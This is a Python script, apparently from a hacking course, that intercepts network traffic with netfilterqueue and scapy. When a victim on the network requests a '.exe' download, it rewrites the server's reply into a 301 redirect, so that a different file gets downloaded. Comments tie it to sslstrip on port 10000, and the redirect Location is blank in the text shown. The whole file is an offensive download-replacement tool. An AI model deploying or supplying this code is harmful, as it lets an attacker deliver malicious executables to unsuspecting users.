#!/usr/bin/env python

# This will only Work in HTTP websites

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # port 80 for html
        # port 10000 for sslstrip
        if scapy_packet[scapy.TCP].dport == 10000:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load and "IP" not in scapy_packet[scapy.Raw].load:
                print("[+] exe file download")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: \n\n")
                # Adding \n\n because sometimes when you change the packet Raw direction
                # it adds automatically and " at the end

                # Convert the scapy packet to string, and then pass the packet we created
                # to the payload
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
